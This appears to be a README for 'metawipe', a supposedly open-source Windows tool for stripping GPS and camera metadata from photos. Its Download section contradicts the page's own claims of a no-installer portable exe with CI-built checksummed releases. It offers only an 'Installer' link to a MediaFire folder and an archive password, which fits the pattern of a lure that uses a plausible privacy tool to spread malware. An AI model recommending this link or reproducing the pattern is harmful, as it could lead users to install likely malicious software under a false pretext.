# metawipe

🧼 Free, open-source EXIF remover for Windows — strip GPS, camera and timestamp data from photos offline. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **One-click folder clean** — every JPEG, PNG, WebP and TIFF in a tree loses GPS, camera and author fields
- ✅ **Shows what it finds first** — a queue lists which files carry GPS, device model or timestamps before wiping
- ✅ **Keeps color profiles** — ICC data can stay, so printing and color work survive the scrub
- ✅ **Copies by default** — cleaned files go to a new folder; originals are never overwritten unless you opt in
- ✅ **Coordinate readout** — GPS values shown as plain numbers before removal, no map service required
- ✅ **No upload ever** — stripping happens locally; nothing about your photos leaves the machine
- ✅ **100 MB self-contained exe** — runtime and imaging codecs bundled, portable, offline, MIT with SHA-256 releases

## Why metawipe

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **metawipe** | ExifTool | ExifCleaner | JPEG Stripper |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free, OSS | Free |
| Open source | **Yes** | Yes | Yes | No |
| Batch folder in one click | **Yes** | Scripted | Yes | Yes |
| Keeps ICC profiles option | **Yes** | Yes | No | No |
| Copies instead of overwriting | **Yes** | Manual | No | No |
| Native exe, no Electron | **Yes, 100 MB** | CLI | No | Dated UI |

## FAQ

**how to remove GPS location data from photos on Windows?**

Phones stamp exact coordinates into every shot, and that data rides along into marketplace listings, forums and group chats. metawipe lists which files carry GPS or camera serials, then strips selected fields while optionally keeping color profiles intact. It is a 100 MB portable exe, MIT, and photos never leave the machine.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark queue (#121417, rose #FB7185): file rows with GPS found, camera model and author badges, big Wipe metadata button, folder drop zone above.
2. Details panel: field checklist with GPS coordinates as numbers, keep-ICC toggle on, timestamp removal warning chip.
3. Results screen: 46 files cleaned, 0 overwritten, copies saved to Cleaned subfolder, per-file field count column.

## Download

| Source | Link |
|---|---|
| 💾 **Installer metawipe** | [Installer metawipe](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).